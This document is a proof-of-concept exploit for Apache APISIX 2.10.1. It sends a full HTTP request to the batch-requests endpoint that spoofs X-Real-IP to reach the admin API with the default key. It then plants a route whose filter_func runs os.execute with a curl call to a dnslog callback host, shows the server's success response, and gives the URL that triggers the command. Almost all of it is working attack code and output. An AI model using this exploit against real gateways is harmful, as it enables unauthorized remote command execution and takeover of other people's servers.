```
POST /apisix/batch-requests HTTP/1.1
Host: X.X.X.X:9080
Content-Length: 427
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://X.X.X.X:9080
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://X.X.X.X:9080/apisix/batch-requests
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"headers":{"X-Real-IP":"localhost","Content-Type":"application/json"},"timeout":500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/test\",\r\n \"service_id\":\"100\"\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl localhost.xxx.dnslog.cn'); return true end\"}"}]}

```

# THE X-Real-IP also work well with 127.0.0.1 and 2130706433

# THE response like this :

```
HTTP/1.1 200 OK
Date: Tue, 22 Feb 2022 08:32:55 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.1
Content-Length: 733

[{"headers":{"Content-Type":"application\/json","Date":"Tue, 22 Feb 2022 08:32:55 GMT","Connection":"close","Access-Control-Allow-Origin":"*","Access-Control-Max-Age":"3600","Access-Control-Expose-Headers":"*","Access-Control-Allow-Credentials":"true","Transfer-Encoding":"chunked","Server":"APISIX\/2.10.1"},"body":"{\"action\":\"set\",\"node\":{\"key\":\"\\\/apisix\\\/routes\\\/index\",\"value\":{\"create_time\":1645502047,\"update_time\":1645518775,\"id\":\"index\",\"priority\":0,\"service_id\":\"100\",\"filter_func\":\"function(vars) os.execute('curl localhost.xxx.dnslog.cn'); return true end\",\"status\":1,\"name\":\"test\",\"uri\":\"\\\/api\\\/test\",\"method\":[\"GET\"]}}}\n","status":200,"reason":"OK"}]
```
# then browse the api route
x.x.x.x:9080/api/test
will exec the command